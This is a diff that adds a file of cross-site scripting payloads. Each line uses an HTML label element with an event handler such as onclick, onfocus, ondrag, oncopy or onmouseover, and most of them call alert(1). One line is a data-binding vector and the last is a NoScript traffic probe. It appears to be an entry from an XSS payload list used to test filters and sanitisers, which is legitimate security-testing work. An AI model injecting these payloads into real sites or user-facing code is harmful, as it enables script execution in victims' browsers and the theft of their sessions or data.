@@ -1,0 +1,34 @@
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+<label draggable="true" ondrag="alert(1)">test</label>
+<label draggable="true" ondragend="alert(1)">test</label>
+<label draggable="true" ondragenter="alert(1)">test</label>
+<label draggable="true" ondragleave="alert(1)">test</label>
+<label draggable="true" ondragstart="alert(1)">test</label>
+<label id=x tabindex=1 onactivate=alert(1)></label>
+<label id=x tabindex=1 onbeforeactivate=alert(1)></label>
+<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>
+<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>
+<label id=x tabindex=1 onfocus=alert(1)></label>
+<label id=x tabindex=1 onfocusin=alert(1)></label>
+<label onbeforecopy="alert(1)" contenteditable>test</label>
+<label onbeforecut="alert(1)" contenteditable>test</label>
+<label onbeforepaste="alert(1)" contenteditable>test</label>
+<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>
+<label onclick="alert(1)">test</label>
+<label oncontextmenu="alert(1)">test</label>
+<label oncopy="alert(1)" contenteditable>test</label>
+<label oncut="alert(1)" contenteditable>test</label>
+<label ondblclick="alert(1)">test</label>
+<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>
+<label onkeydown="alert(1)" contenteditable>test</label>
+<label onkeypress="alert(1)" contenteditable>test</label>
+<label onkeyup="alert(1)" contenteditable>test</label>
+<label onmousedown="alert(1)">test</label>
+<label onmouseenter="alert(1)">test</label>
+<label onmouseleave="alert(1)">test</label>
+<label onmousemove="alert(1)">test</label>
+<label onmouseout="alert(1)">test</label>
+<label onmouseover="alert(1)">test</label>
+<label onmouseup="alert(1)">test</label>
+<label onpaste="alert(1)" contenteditable>test</label>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
